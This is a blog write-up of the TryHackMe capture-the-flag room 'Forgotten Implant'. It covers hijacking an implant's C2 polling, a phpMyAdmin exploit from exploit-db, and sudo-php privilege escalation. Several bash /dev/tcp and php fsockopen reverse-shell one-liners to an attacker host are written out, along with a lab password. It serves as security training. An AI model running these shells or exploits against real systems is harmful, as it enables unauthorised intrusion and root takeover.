---
title: Forgotten Implant
layout: post
tags: [linux, ctf, tryhackme]
date: 1 August 2023
comments: true
---

# About

Forgotten Implant is a CTF hosted on TryHackMe
[here](https://tryhackme.com/room/forgottenimplant). This is a CTF where you
must constantly search for very small hints since the attack surface is almost
non existent. I think in some ways this can simulate a more realistic
experience, if the target is not a webserver, but more of some personal
computer.

# Walkthrough

I usually like to start by doing an `export IP=...` so that I don't have to
remember the IP of the target all the time.

Next I have started the usual nmap scan with

```console
nmap -sC -sV $IP
```

The nmap scan provided no open ports. I have also tried to look for UDP ports,
but that seemed to not be useful, altough I found `68/udp open|filtered dhcpc`
port 68 open.

While being stuck and thinking about the problem, I already knew from the
description that we have some sort of process running on the target. So I
brainstormed a bit on how I would implement it and what I would want it to do
to let me have access to the target. "Somehow open a random port?" - I
continued to scan just in case that happened, but no. "Somehow make a
_revshell_ request?" - I decided to open up wireshark and check if there was
any incoming traffic.

<p align="center">
  <img src="/images/forgottenimplant/02-wireshark.png" width="1000"/>
</p>

The incoming traffic only appeared after doing the initial scan, however. I
tested it after and it would only start to send on port 81 after doing the
`nmap $IP` scan first. Open wireshark and listen on `tun0` device or whatever
you use to connect to the thm vpn.

So, we receive some messages on port 81. Now we have a new lead. Next I started
a http server on port 81 using the python http module.

```console
sudo python -m http.server 81
```

<p align="center">
  <img src="/images/forgottenimplant/03-listen-81.png" width="1000"/>
</p>

This seems to try to access some random base64 paths. At first I wanted to try
and find some C2 tools, since I had no experience with this, other than some
YouTube exploration videos. But I was not able to find the format that we
received. So next I wanted to see what each thing meant using the `base64 -d`
command.

<p align="center">
  <img src="/images/forgottenimplant/04-received-81.png" width="1000"/>
</p>

It seems like it is trying to get some command from the http server. Maybe we
can try to mock up some of the paths. For example, I would say the `get-job`
looks the easiest to do, and also sounds like a path you would access to *GET*
a command to run.

<p align="center">
  <img src="/images/forgottenimplant/05-send-payload.png" width="1000"/>
</p>

Basically I created a file with the name as the base64 string inside the
`get-job` folder.

```console
mkdir get-job
echo '{"job_id": 1, "cmd": "bash -c \"bash -i >& /dev/tcp/HOST_IP/6969 0>&1\""}' | base64 > get-job/ImxhdGVzdCI=
```

Then you would open a listener `nc -lvnp 6969` and start the http server `sudo
python -m http.server 81`. After some time you should have a revshell on the
target as the ada user.

And we find the flag in the home of the ada user.

**First Flag**: `cat /home/ada/user.txt`

<p align="center">
  <img src="/images/forgottenimplant/06-revshell.png" width="1000"/>
</p>

Some reconnaissance of the `ada` user
- we find a database script with a password in it s4Ucbrme
- we also find a hidden folder `.implant/implant.py` file executed in a cronjob
- we can use linpeas (but I did not find anything interesting)
- we can use pspy
- there is also another user fi that has a script sniffer.py wihch runs as root
- there is also a apache2 service running
- I made a guess and found that the server runs on port 80 with curl

Since we have found a http server running I wanted to check the `/var/www/`
folder and see if I can find anything interesting. I have found that the server
is a phpmyadmin thing, which I had some experience with from another CTF
challenge. So I wanted to try the same exploit from
<https://www.exploit-db.com/exploits/50457>.

We can run the exploit script on the target like this

```console
python3 exploit.py 127.0.0.1 80 / app s4Ucbrme id
```

This worked and gave us the user `www-data`. So we can try to do a revshell on
it. We can create a `shell.sh` file with the following content

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/HOST_IP/6870 0>&1
```

Then we open the exploit and a listener on the host

On host: `nc -lvnp 6970`

On target as ada:

```console
python3 exploit.py 127.0.0.1 80 / app s4Ucbrme shell.sh
```

This will allow us to connect on the target as `www-data`. Next we can check
some of the usual things, like `env`, `sudo -l`, etc. Luckily `www-data` can
run php as root using sudo. So we can create another revshell with

```console
sudo php -r '$sock=fsockopen("HOST_IP",6971);exec("/bin/bash <&3 >&3 2>&3");'
```

and on the host we need to run `nc -lvnp 6971`

This will allow us to connect as root. And we find the flag in the root home.

**Second Flag**: `cat /root/.root.txt`

# Conclusion

A straightforward CTF-like room, with very small attack surface. I have looked
into some interesting topics, like lateral movement and some simple exploits. I
feel like the hardest part of the challenge was getting the initial access. I
think it was hard because you need to understand how a potential C2 would work.
And also because it is discouraging when you have to write the exploit code
yourself, and not be able to go full script kiddie mode with existing tools. At
the same time, it is this type of challenge that helps you learn the most.
